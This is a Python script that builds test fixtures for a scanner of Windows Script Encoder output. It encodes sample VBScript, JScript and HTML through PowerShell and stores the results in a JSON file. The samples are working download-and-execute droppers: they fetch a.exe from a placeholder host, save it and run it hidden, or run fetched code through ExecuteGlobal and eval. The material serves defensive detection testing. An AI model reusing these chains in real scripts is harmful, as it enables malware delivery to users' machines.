"""Build the encoded-script test fixtures of ``tests/fixtures_screnc`` - run once, by hand.

    python tests/build_screnc_fixtures.py

Encodes the plain texts below with Windows' own Script Encoder (the ``Scripting.Encoder``
object of the Windows Script Host, reached through PowerShell; allowed by phageo on
2026-10-11 for test fixtures only - CLAUDE.md, rule 14) and writes plain and encoded text,
with the SHA-256 of the encoded one, into ``tests/fixtures_screnc/fixtures.json``. The
tests read that file and never need the encoder.

The encoder only rewrites text: nothing of what is encoded is run, here or in the tests
(the scripts are scanned from memory). Addresses are under ``example.invalid``. A fixture
that is in the file already is kept as it is; only new ones are encoded.
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "fixtures_screnc", "fixtures.json")

EVERY = "\t" + "".join(chr(c) for c in range(32, 127))
VBS_GET = ('Set http = CreateObject("MSXML2.XMLHTTP")\r\n'
           'http.Open "GET", "https://files.example.invalid/%s", False\r\nhttp.Send\r\n')
VBS_SAVE = ('Set stream = CreateObject("ADODB.Stream")\r\nstream.Type = 1\r\nstream.Open\r\n'
            'stream.Write http.responseBody\r\nstream.SaveToFile "%s", 2\r\n')
JS_GET = ('var http = new ActiveXObject("MSXML2.XMLHTTP");\r\n'
          'http.open("GET", "https://files.example.invalid/%s", false);\r\nhttp.send();\r\n')
JS_SAVE = ('var stream = new ActiveXObject("ADODB.Stream");\r\nstream.Type = 1;\r\nstream.Open();\r\n'
           'stream.Write(http.responseBody);\r\nstream.SaveToFile("%s", 2);\r\n')
FIXTURES = {        # name: (kind handed to the encoder, plain text)
    # every character the encoder knows at every step of its pattern of 64
    "TABLE": (".vbs", "".join("'" + "x" * k + EVERY + "\r\n" for k in range(64))),
    "VBS_DROPPER": (".vbs", VBS_GET % "a.exe" + VBS_SAVE % "a.exe"
                    + 'CreateObject("WScript.Shell").Run "a.exe", 0, False\r\n'),
    "VBS_TWIN": (".vbs", VBS_GET % "news.bin" + VBS_SAVE % "news.bin"
                 + 'CreateObject("WScript.Shell").Run "notepad.exe readme.txt", 1, False\r\n'),
    "VBS_EXECUTE": (".vbs", VBS_GET % "step.vbs" + "ExecuteGlobal http.responseText\r\n"),
    "JS_DROPPER": (".js", JS_GET % "a.exe" + JS_SAVE % "a.exe"
                   + 'var shell = new ActiveXObject("WScript.Shell");\r\nshell.Run("a.exe", 0, false);\r\n'),
    "JS_TWIN": (".js", JS_GET % "news.bin" + JS_SAVE % "news.bin"
                + 'var shell = new ActiveXObject("WScript.Shell");\r\nshell.Run("notepad.exe readme.txt", 1, false);\r\n'),
    "JS_EVAL": (".js", JS_GET % "step.js" + "eval(http.responseText);\r\n"),
    # characters outside ASCII: Turkish and Japanese text in comments and in a text, around a chain
    "UNICODE": (".vbs", "' Merhaba d\u00fcnya: \u011f\u00fc\u015f\u0131\u00f6\u00e7 \u011e\u00dc\u015e\u0130\u00d6\u00c7\r\n"
                + VBS_GET % "step.vbs"
                + 'MsgBox "\u3053\u3093\u306b\u3061\u306f\u4e16\u754c <\u30c6\u30b9\u30c8> @ \u0131\u015f\u0131k"\r\n'
                + "' \u65e5\u672c\u8a9e\u306e\u30b3\u30e1\u30f3\u30c8\r\nExecuteGlobal http.responseText ' \u00e7al\u0131\u015ft\u0131r\r\n"),
    # a page: the encoder finds the script blocks itself and marks them as encoded
    "PAGE": (".htm", '<html>\r\n<head>\r\n<script language="VBScript">\r\n' + VBS_GET % "step.vbs"
             + 'ExecuteGlobal http.responseText\r\n</script>\r\n<script language="JScript">\r\n'
             + 'var greeting = "hello <world> @ home";\r\n</script>\r\n</head>\r\n<body>page</body>\r\n</html>\r\n'),
}
SCRIPT = ("$e = New-Object -ComObject Scripting.Encoder; "
          "$t = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%s')); "
          "$o = $e.EncodeScriptFile('%s', $t, 0, ''); "
          "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($o))")


def encode(kind: str, plain: str) -> str:
    command = SCRIPT % (base64.b64encode(plain.encode("utf-8")).decode("ascii"), kind)
    done = subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
                          capture_output=True, text=True, timeout=120)
    if done.returncode or not done.stdout.strip():
        raise SystemExit("the encoder failed: %s" % done.stderr[-400:])
    return base64.b64decode(done.stdout.strip()).decode("utf-8").rstrip("\x00")


def main() -> int:
    kept = {}
    if os.path.isfile(OUT):
        with open(OUT, encoding="utf-8") as fh:
            kept = json.load(fh)["fixtures"]
    built = 0
    for name, (kind, plain) in FIXTURES.items():
        if name in kept:
            continue
        encoded = encode(kind, plain)
        kept[name] = {"kind": kind, "plain": plain, "encoded": encoded,
                      "sha256": hashlib.sha256(encoded.encode("utf-8")).hexdigest()}
        built += 1
    with open(OUT, "w", encoding="utf-8", newline="\n") as fh:
        json.dump({"encoder": "Scripting.Encoder (Windows Script Host), through PowerShell", "fixtures": kept},
                  fh, indent=1, sort_keys=True)
        fh.write("\n")
    print("%d new, %d kept -> %s" % (built, len(kept) - built, OUT))
    return 0


if __name__ == "__main__":
    sys.exit(main())
